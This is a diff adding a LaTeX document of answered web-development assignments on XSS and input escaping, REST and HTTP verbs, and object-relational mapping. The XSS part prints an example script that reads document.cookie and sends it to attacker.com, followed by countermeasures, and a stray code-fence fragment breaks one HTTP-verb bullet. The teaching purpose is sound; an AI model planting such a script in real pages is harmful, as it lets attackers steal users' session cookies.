@@ -1,0 +1,86 @@
+\documentclass{article}
+\begin{document}
+\section*{Working with Forms and User Input}
+
+\subsection*{Assignment 1: User Input Handling and Escaping}
+\subsubsection*{(a) Concepts of Input Escaping and XSS Attacks}
+Input escaping is a technique used to sanitize and encode user input before displaying it in web pages. The purpose is to prevent the execution of malicious code embedded in user input, ensuring that the input is treated as data rather than executable code. By escaping characters with special meaning in HTML, JavaScript, or other contexts, the input is rendered harmless and displayed as intended.
+
+Cross-Site Scripting (XSS) attacks occur when an attacker injects malicious scripts into a web application, which are then executed by unsuspecting users viewing the affected page. This attack is possible when user input is not properly sanitized or validated before being displayed.
+
+\subsubsection*{(b) Example of XSS Attack and Countermeasures}
+Let's consider a simple example involving a comment section on a blog website. Users can submit comments that are displayed on the blog post page. Suppose the website does not properly handle user input and fails to sanitize it.
+
+An attacker can exploit this vulnerability by submitting a comment containing a malicious script, such as:
+
+\begin{verbatim}
+<script>
+  // Malicious script to steal user information
+  const data = document.cookie;
+  const img = new Image();
+  img.src = 'http://attacker.com/steal?data=' + encodeURIComponent(data);
+</script>
+\end{verbatim}
+
+When other users view the blog post page, the script is executed in their browsers. It steals their cookies and sends them to the attacker's server.
+
+To prevent XSS attacks, developers should implement the following countermeasures:
+
+\begin{itemize}
+  \item \textbf{Input Validation}: Validate and sanitize all user input on the server-side, removing or escaping any characters with special meaning in the target output context (e.g., HTML, JavaScript). Use appropriate validation libraries or frameworks to ensure input integrity.
+  \item \textbf{Output Encoding}: Before displaying user input, encode it using the appropriate encoding method for the output context. For HTML, use HTML entity encoding (e.g., \&lt; for <). For JavaScript, use JavaScript encoding (e.g., \texttt{JSON.stringify()}).
+  \item \textbf{Content Security Policy (CSP)}: Implement a strict Content Security Policy that specifies which sources are allowed to be executed on a web page. This helps prevent the execution of any unauthorized scripts.
+  \item \textbf{Context-Specific Output Handling}: Be mindful of the output context (e.g., HTML, JavaScript) and ensure that user input is treated as data and not code. Use context-specific escaping libraries or functions provided by your programming language or framework.
+  \item \textbf{Regular Security Updates}: Keep your web application and its dependencies up to date with the latest security patches. This helps protect against known vulnerabilities that can be exploited by attackers.
+\end{itemize}
+
+\section*{Introduction to RESTful APIs}
+
+\subsection*{Assignment 2: Key Concepts of REST and HTTP Verbs}
+\subsubsection*{(a) Core Principles of REST Architecture}
+Representational State Transfer (REST) is an architectural style designed for building scalable and loosely coupled web services. The core principles of REST are as follows:
+\begin{itemize}
+  \item \textbf{Stateless Communication}: Each client request to the server must contain all the necessary information to understand and process the request. The server doesn't maintain any client state between requests.
+  \item \textbf{Resource-Oriented}: REST treats resources as the key concept in the system. Resources are identified by unique URIs, and clients interact with these resources using standard HTTP methods.
+  \item \textbf{Uniform Interface}: RESTful APIs provide a uniform interface for accessing and manipulating resources. This interface is typically based on standard HTTP methods and supports various data formats such as JSON or XML for data exchange.
+  \item \textbf{Layered Architecture}: REST allows for a layered architecture, where intermediaries such as proxies or caches can be added between clients and servers to improve scalability, performance, and security.
+\end{itemize}
+
+\subsubsection*{(b) Significance of HTTP Verbs in Building RESTful APIs}
+HTTP verbs (GET, POST, PUT, DELETE, etc.) play a crucial role in building RESTful APIs. They define the actions that clients can perform on resources. Here are some common scenarios for each HTTP verb:
+\begin{itemize}
+  \item \textbf{GET}: Used to retrieve a representation of a resource. For example, retrieving a list of articles from a blog API or fetching a user's profile information.
+  \item \textbf{POST}: Used to create a new resource. For example```latex
+  creating a new blog post or submitting a form to create a new user account.
+  \item \textbf{PUT}: Used to update an existing resource. For example, updating the content of a blog post or modifying a user's profile information.
+  \item \textbf{DELETE}: Used to remove a resource. For example, deleting a blog post or deleting a user account.
+\end{itemize}
+
+The use of these HTTP verbs provides a clear and standardized way to perform operations on resources in a RESTful API. By adhering to these conventions, developers can build APIs that are intuitive, self-descriptive, and interoperable.
+
+\section*{Introduction to Object-Relational Mapping (ORM)}
+
+\subsection*{Assignment 3: Benefits of ORM in Database Operations}
+\subsubsection*{(a) Concept of Object-Relational Mapping (ORM)}
+Object-Relational Mapping (ORM) is a programming technique that allows developers to interact with a relational database using object-oriented paradigms. It provides a layer of abstraction that maps database tables to classes, database rows to objects, and database operations to method calls.
+
+ORM frameworks handle the translation between the object-oriented model used in application code and the relational model used in databases. They provide features like automatic data mapping, query generation, caching, and transaction management.
+
+\subsubsection*{Benefits of ORM in Simplifying Database Interactions}
+ORM offers several benefits in simplifying database interactions compared to traditional SQL queries:
+\begin{itemize}
+  \item \textbf{Increased Productivity}: ORM frameworks abstract away the complexities of writing SQL queries manually. Developers can work with higher-level object-oriented constructs, reducing the amount of boilerplate code needed for database operations.
+  \item \textbf{Portability}: ORM frameworks provide a layer of abstraction that allows developers to write database-agnostic code. The same application code can be used with different database systems without significant modifications.
+  \item \textbf{Maintainability}: With ORM, database operations are expressed using familiar object-oriented paradigms, making the code easier to understand and maintain. Developers can focus more on the application logic rather than dealing with low-level SQL details.
+  \item \textbf{Performance Optimization}: ORM frameworks often include features like query optimization, caching, and lazy-loading to improve performance. These optimizations are handled transparently by the framework, reducing the need for manual tuning.
+  \item \textbf{Database Abstraction}: ORM allows developers to work with objects and classes that directly represent database entities, rather than dealing with raw SQL. This abstraction simplifies the database interaction code and promotes cleaner, more modular designs.
+\end{itemize}
+
+\subsubsection*{Example of ORM Reducing the Need for Manual Data Mapping}
+Consider a scenario where you have a \texttt{User} class representing a user entity in your application. With ORM, you can define a mapping between the \texttt{User} class and a corresponding database table. The ORM framework handles the mapping and automatically generates the required SQL queries for CRUD (Create, Read, Update, Delete) operations.
+
+For example, to insert a new user into the database using ORM, you can simply create a new instance of the \texttt{User} class, set the desired properties, and call a save method provided by the ORM framework. The framework takes care of generating the appropriate SQL INSERT statement and mapping the object properties to table columns.
+
+This eliminates the need to manually write and execute SQL INSERT queries, as the ORM framework handles the data mapping and SQL generation behind the scenes.
+
+\end{document}
